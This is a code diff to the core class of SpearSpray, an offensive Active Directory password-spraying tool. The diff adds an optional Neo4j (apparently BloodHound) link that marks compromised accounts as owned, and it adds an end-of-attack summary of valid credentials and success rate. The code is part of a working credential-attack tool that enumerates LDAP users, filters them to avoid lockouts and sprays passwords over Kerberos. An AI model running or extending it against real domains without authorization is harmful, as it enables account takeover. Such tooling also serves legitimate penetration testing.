@@ -3,7 +3,7 @@ import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import List, Tuple, Generator
 
-from spearspray.utils.constants import GREEN, RED, YELLOW, BOLD, RESET
+from spearspray.utils.constants import GREEN, RED, YELLOW, BLUE, BOLD, RESET
 from spearspray.modules.variables import VariablesManager
 from spearspray.modules.patterns import Patterns
 from spearspray.modules.kerberos import Kerberos
@@ -21,6 +21,7 @@ from spearspray.utils.ldap_utils import (
     filter_threshold_users,
     filter_pso_users
 )
+from spearspray.modules.neo4j import Neo4j
 
 class SpearSpray:
     
@@ -36,6 +37,11 @@ class SpearSpray:
         self.query = args.query
         self.ssl = args.ssl
         self.ldap_page_size = args.ldap_page_size
+
+        # Neo4j connection parameters
+        self.neo4j_username = args.neo4j_username
+        self.neo4j_password = args.neo4j_password
+        self.neo4j_uri = args.uri
 
         # Attack configuration
         self.threads = args.threads
@@ -65,22 +71,32 @@ class SpearSpray:
 
         are_all_variables_registered(patterns_detected, variables_registered)
 
-        # LDAP enumeration and domain policy (and PSO) filtering
+        # Neo4j connection
+
+        neo4j_instance = None
+        if self.neo4j_username and self.neo4j_password:
+            neo4j_instance = Neo4j(self.neo4j_username, self.neo4j_password, self.neo4j_uri,)
+            if neo4j_instance.connect() is None:
+                sys.exit(1)
+
+        # LDAP connection and enumeration
  
         ldap_instance, ldap_connection = connect_to_ldap(self.target, self.domain, self.username, self.password, self.ssl, self.ldap_page_size)
 
         domain_policy = get_domain_password_policy(ldap_instance, ldap_connection)
         handle_domain_password_policy(domain_policy)
 
-        users_objects = get_users_from_ldap(ldap_instance, ldap_connection, self.query, self.fields)
+        users_objects = get_users_from_ldap(ldap_instance, ldap_connection, self.query, self.fields, self.username)
         ldap_instance.close_connection(ldap_connection)
+        
+        # Apply user filtering: PSO users and threshold-based filtering
+        
         users_objects = filter_pso_users(users_objects)
         users_objects = filter_threshold_users(users_objects, domain_policy, self.threshold)
         
         if len(users_objects) == 0:
             self.log.error(f"{RED}[-]{RESET} No users remaining after filtering. Exiting.")
             sys.exit(1)
-
 
         self.log.warning(f"{BOLD}{YELLOW}[*] Password spraying will be performed against {len(users_objects)} users.{RESET}")
 
@@ -89,9 +105,12 @@ class SpearSpray:
         filtered_variables = get_used_variables(variables_registered, selected_pattern)
 
         # Execute password spraying attack
-        kerberos_instance = Kerberos(domain=self.domain, kdc=self.target, jitter=self.jitter, max_rps=self.max_rps,)
+        kerberos_instance = Kerberos(domain=self.domain, kdc=self.target, jitter=self.jitter, max_rps=self.max_rps, neo4j_instance=neo4j_instance)
         self.log.warning(f"{YELLOW}[*]{RESET} Starting password spraying against {len(users_objects)} users...")
         self._spray(kerberos_instance, users_objects, selected_pattern, filtered_variables)
+
+        if neo4j_instance:
+            neo4j_instance.close()
 
     def _build_credentials(self, users_objects: list[dict], selected_pattern: str, filtered_variables: list[str]) -> Generator[Tuple[str, str], None, None]:
 
@@ -108,7 +127,6 @@ class SpearSpray:
 
         # TODO: Implement estimated time remaining based on total users, threads, jitter and max requests per second
         # TODO: Consider implementing an interactive progress feature similar to Nmap (allow pressing Enter to display remaining spraying duration and current progress)
-        # TODO: Add a results summary at the end of the spraying process
 
         total_users = len(users_objects)
         credentials = self._build_credentials(users_objects, selected_pattern, filtered_variables)
@@ -146,3 +164,31 @@ class SpearSpray:
                         break
 
         kerberos_instance.cleanup()
+
+        self._display_attack_summary(kerberos_instance)
+
+    def _display_attack_summary(self, kerberos_instance: Kerberos) -> None:
+        """Display a simple summary of the password spraying attack results."""
+        
+        stats = kerberos_instance.get_statistics()
+        total_valid = kerberos_instance.get_valid_credentials_count()
+
+        if stats['valid_credentials'] > 0 or stats['expired_credentials'] > 0:
+            self.log.info(f"\n{BOLD}Attack Results:{RESET}")
+
+            self.log.info(f"  Valid credentials: {GREEN}{stats['valid_credentials']}{RESET}")
+            self.log.info(f"  Expired passwords: {YELLOW}{stats['expired_credentials']}{RESET}")
+        
+            if self.neo4j_username and self.neo4j_password:
+                self.log.info(f"  Marked as owned:   {GREEN}{stats['neo4j_owned']}{RESET}")
+            
+            # Calculate and display success rate
+            total_attempts = sum([stats['valid_credentials'], stats['expired_credentials'], 
+                                stats['locked_accounts'], stats['valid_usernames'], 
+                                stats['failed_attempts'], stats['other_errors']])
+            success_rate = (total_valid / total_attempts * 100) if total_attempts > 0 else 0
+            
+            self.log.info(f"  Total attempts:    {BLUE}{total_attempts}{RESET}")
+            self.log.info(f"  Success rate:      {GREEN if success_rate > 0 else RED}{success_rate:.2f}%{RESET}")
+        
+            print()
